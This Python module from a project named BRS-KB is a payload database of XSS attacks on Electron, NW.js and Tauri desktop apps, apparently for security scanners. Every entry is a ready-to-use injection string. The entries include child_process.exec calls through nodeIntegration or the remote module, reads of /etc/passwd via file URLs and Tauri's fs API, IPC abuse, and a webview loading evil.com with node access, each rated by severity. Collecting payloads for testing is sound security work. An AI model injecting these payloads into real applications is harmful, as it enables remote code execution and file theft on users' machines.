#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

Electron/Desktop App XSS Payloads
XSS in Electron and similar frameworks
"""

from ..models import PayloadEntry


ELECTRON_XSS_DATABASE = {
    # ===== NODEINTEGRATION XSS =====
    "electron_node_001": PayloadEntry(
        payload="<img src=x onerror=\"require('child_process').exec('calc')\">",
        contexts=["html_content"],
        tags=["electron", "nodeintegration", "rce"],
        severity="critical",
        cvss_score=10.0,
        description="Electron nodeIntegration RCE",
        reliability="high",
    ),
    "electron_node_002": PayloadEntry(
        payload='<script>require("child_process").exec("id")</script>',
        contexts=["html_content", "javascript"],
        tags=["electron", "nodeintegration", "rce"],
        severity="critical",
        cvss_score=10.0,
        description="Electron require exec",
        reliability="high",
    ),
    "electron_node_003": PayloadEntry(
        payload='<script>const {shell}=require("electron");shell.openExternal("file:///etc/passwd")</script>',
        contexts=["html_content", "javascript"],
        tags=["electron", "shell", "file_read"],
        severity="critical",
        cvss_score=9.0,
        description="Electron shell.openExternal",
        reliability="high",
    ),
    # ===== PRELOAD SCRIPT XSS =====
    "electron_preload_001": PayloadEntry(
        payload='<script>window.api.dangerouslyExposeMethod("id")</script>',
        contexts=["html_content", "javascript"],
        tags=["electron", "preload", "ipc"],
        severity="critical",
        cvss_score=9.0,
        description="Preload exposed API abuse",
        reliability="medium",
    ),
    # ===== IPC ABUSE =====
    "electron_ipc_001": PayloadEntry(
        payload='<script>require("electron").ipcRenderer.send("ELECTRON_BROWSER_WINDOW_ALERT",1,"XSS")</script>',
        contexts=["html_content", "javascript"],
        tags=["electron", "ipc"],
        severity="high",
        cvss_score=7.5,
        description="IPC alert abuse",
        reliability="medium",
    ),
    "electron_ipc_002": PayloadEntry(
        payload='<script>require("electron").ipcRenderer.sendSync("ELECTRON_INTERNAL_MESSAGE","executeJavaScript","alert(1)")</script>',
        contexts=["html_content", "javascript"],
        tags=["electron", "ipc", "internal"],
        severity="critical",
        cvss_score=9.0,
        description="IPC internal message abuse",
        reliability="low",
    ),
    # ===== REMOTE MODULE =====
    "electron_remote_001": PayloadEntry(
        payload='<script>require("electron").remote.getCurrentWindow().destroy()</script>',
        contexts=["html_content", "javascript"],
        tags=["electron", "remote"],
        severity="high",
        cvss_score=7.5,
        description="Remote module window destroy",
        reliability="medium",
    ),
    "electron_remote_002": PayloadEntry(
        payload='<script>require("@electron/remote").require("child_process").exec("calc")</script>',
        contexts=["html_content", "javascript"],
        tags=["electron", "remote", "rce"],
        severity="critical",
        cvss_score=10.0,
        description="Remote require exec",
        reliability="medium",
    ),
    # ===== FILE PROTOCOL =====
    "electron_file_001": PayloadEntry(
        payload='<webview src="file:///etc/passwd"></webview>',
        contexts=["html_content"],
        tags=["electron", "webview", "file_read"],
        severity="high",
        cvss_score=7.5,
        description="Webview file read",
        reliability="medium",
    ),
    "electron_file_002": PayloadEntry(
        payload='<iframe src="file:///etc/passwd"></iframe>',
        contexts=["html_content"],
        tags=["electron", "iframe", "file_read"],
        severity="high",
        cvss_score=7.5,
        description="Iframe file read",
        reliability="medium",
    ),
    # ===== WEBVIEW XSS =====
    "electron_webview_001": PayloadEntry(
        payload='<webview src="https://evil.com" nodeintegration></webview>',
        contexts=["html_content"],
        tags=["electron", "webview", "nodeintegration"],
        severity="critical",
        cvss_score=9.0,
        description="Webview nodeintegration",
        reliability="low",
    ),
    # ===== NW.JS XSS =====
    "nwjs_001": PayloadEntry(
        payload='<script>require("nw.gui").Shell.openExternal("file:///etc/passwd")</script>',
        contexts=["html_content", "javascript"],
        tags=["nwjs", "shell", "rce"],
        severity="critical",
        cvss_score=9.0,
        description="NW.js Shell openExternal",
        reliability="medium",
    ),
    # ===== TAURI XSS =====
    "tauri_001": PayloadEntry(
        payload='<script>__TAURI__.fs.readTextFile("/etc/passwd").then(alert)</script>',
        contexts=["html_content", "javascript"],
        tags=["tauri", "fs", "file_read"],
        severity="critical",
        cvss_score=9.0,
        description="Tauri fs readTextFile",
        reliability="medium",
    ),
    "tauri_002": PayloadEntry(
        payload='<script>__TAURI__.shell.execute("id").then(r=>alert(r.stdout))</script>',
        contexts=["html_content", "javascript"],
        tags=["tauri", "shell", "rce"],
        severity="critical",
        cvss_score=10.0,
        description="Tauri shell execute",
        reliability="medium",
    ),
}

ELECTRON_XSS_TOTAL = len(ELECTRON_XSS_DATABASE)
